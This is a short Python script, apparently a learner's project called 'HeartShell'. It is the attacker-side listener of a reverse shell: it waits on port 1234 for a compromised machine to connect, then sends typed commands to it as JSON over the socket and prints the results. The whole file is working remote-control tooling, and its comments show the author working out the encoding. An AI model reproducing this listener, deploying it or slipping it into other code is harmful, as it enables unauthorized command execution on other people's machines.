#!/usr/bin/python3

import socket
from termcolor import colored
import json



def reliable_send(data):
	json_data = json.dumps(data) 
	target.send(json_data.encode('utf-8')) # HERE IS WHERE THE DATA IS ENCODED TO SEND THROUGH SOCKET


def reliable_recv():
	data = ""
	while True:
		try:
			data = data + target.recv(1024).decode('utf-8') # HERE IS WHERE DATA RECV DECODED FOR JSON MANIPULATION
			return json.loads(data)
		except ValueError:
			continue


def shell():
	while True:
		command = input(f"*HeartShell-{str(ip)}#: ") # data type String
		# reliable_send(command.encode('utf-8')) # already dumps by json (? data type) --> need convert??
		reliable_send(command) 	# answer line 27: no convert --> JSON doesn't apply to bytes
		# End shell session
		if command == 'q':
			break
		else:
			# result = target.recv(1024) # data type Bytes
			result = reliable_recv() # need decode??? --> nope, already decode in the function
			print(result)

def server():
	# Creating global variables so that can be used in different functions
	global s
	global target
	global ip
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

	host = '0.0.0.0'
	port = 1234

	s.bind((host, port))
	s.listen(5)

	print(colored("[+] Listening for incoming connection ...", 'green'))

	target, ip = s.accept()

	print(colored(f"[+] Connection established from: {str(ip)}", 'green'))

	s.close()

server()
shell()